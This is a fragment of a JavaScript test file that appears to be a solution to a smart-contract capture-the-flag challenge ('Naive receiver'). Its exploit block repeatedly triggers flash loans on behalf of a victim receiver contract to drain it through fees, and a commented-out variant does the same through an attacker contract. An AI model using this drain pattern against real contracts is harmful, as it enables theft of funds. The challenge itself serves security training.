...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        for (let i = 0; i < 10; i++) {
            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('5'));
        }

        /*
        // Attack contract deployment
        const AttackContract = await ethers.getContractFactory('AttackerContract', attacker);
        this.attackerContract = await AttackContract.deploy(this.receiver.address, this.pool.address);

        await this.attackerContract.execute10flashLoans();
        */
    });
